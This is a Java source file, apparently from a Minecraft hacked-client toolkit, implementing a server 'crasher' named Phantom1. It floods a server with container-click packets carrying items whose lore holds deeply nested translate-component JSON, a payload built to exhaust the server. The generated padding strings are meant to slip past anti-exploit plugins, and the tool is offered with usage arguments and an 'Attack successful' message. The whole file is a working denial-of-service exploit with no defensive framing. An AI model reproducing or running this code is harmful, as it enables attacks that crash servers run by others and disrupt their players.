package us.whitedev.crashers.impl;

import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Optional;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.network.protocol.Packet;
import net.minecraft.network.protocol.game.ServerGamePacketListener;
import net.minecraft.network.protocol.game.ServerboundCommandSuggestionPacket;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import us.whitedev.crashers.Crasher;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.helpers.BypassHelper.StringType;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

public class Phantom1 implements Crasher {
    private static final String METHOD_NAME = "Phantom1";
    private boolean enabled = false;

    public Phantom1() {
    }

    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int power = Integer.parseInt(args[3]);
        String type = args[4].toLowerCase(Locale.ROOT);
        this.setEnabled(true);
        msgHelper.sendMessage("Starting crashing with &f" + this.getName(), true);
        Packet<ServerGamePacketListener> packet = this.getPacketAbuser(type, power);
        if (packet != null) {
            for(int i = 0; i < packets; ++i) {
                PacketHelper.send(packet);
            }
        } else {
            msgHelper.sendMessage("&cInvalid &7\"type\" argument!", true);
        }

        this.setEnabled(false);
        msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
    }

    private Packet<ServerGamePacketListener> getPacketAbuser(String type, int power) {
        CompoundTag comp = new CompoundTag();
        ListTag lore = new ListTag();
        String translate = "{\"translate\":\"%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[{\"translate\":\"%1$s%1$s%1$s%1$s\",\"with\":[\"..\"]}]}]}]}]}]}]}]}]}]}]}]}]}";
        String extra = bypassHelper.generateString(power, StringType.BOOST2);
        String smallExtra = bypassHelper.generateString(1, StringType.BOOST2);
        CompoundTag display = new CompoundTag();
        Int2ObjectMap<ItemStack> itemMap = new Int2ObjectOpenHashMap();
        switch (type) {
            case "default":
            case "ef-bypass":
                StringTag loreLine = new StringTag(translate);

                for(int i = 0; i < 4; ++i) {
                    lore.add(loreLine);
                }

                display.put("Name", new StringTag(type.equals("ef-bypass") ? smallExtra : extra));
                display.put("Lore", lore);
                comp.put("display", display);
                ItemStack itemStack = new ItemStack(Items.CHERRY_CHEST_BOAT, 1, Optional.of(comp));

                for(int i = 0; i < 10; ++i) {
                    itemMap.put(i, itemStack);
                }

                return new ServerboundContainerClickPacket(0, 0, 1, 1, ClickType.PICKUP, itemStack, itemMap);
            case "low-data":
                lore.add(new StringTag(translate));
                display.put("Name", new StringTag(smallExtra));
                display.put("Lore", lore);
                comp.put("display", display);
                ItemStack itemStack = new ItemStack(Items.CHERRY_CHEST_BOAT, 1, Optional.of(comp));
                itemMap.put(0, itemStack);
                return new ServerboundContainerClickPacket(0, 0, 1, 1, ClickType.PICKUP, itemStack, itemMap);
            case "unreachable":
                return new ServerboundCommandSuggestionPacket(0, "xynis");
            default:
                return null;
        }
    }

    public String getName() {
        return "Phantom1";
    }

    public boolean getEnabled() {
        return this.enabled;
    }

    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    public List<OptionUtil> getOptions() {
        return List.of(new OptionUtil("Packets", OptionType.INTEGER), new OptionUtil("Power", OptionType.INTEGER), new OptionUtil("Type", OptionType.LIST, new String[]{"Default", "EF-Bypass", "Low-Data", "Unreachable"}));
    }

    public String getArgsUsage() {
        return "packets[100], power[10], type[default]";
    }

    public String getDescription() {
        return "Low/Medium Data Server Crasher";
    }
}
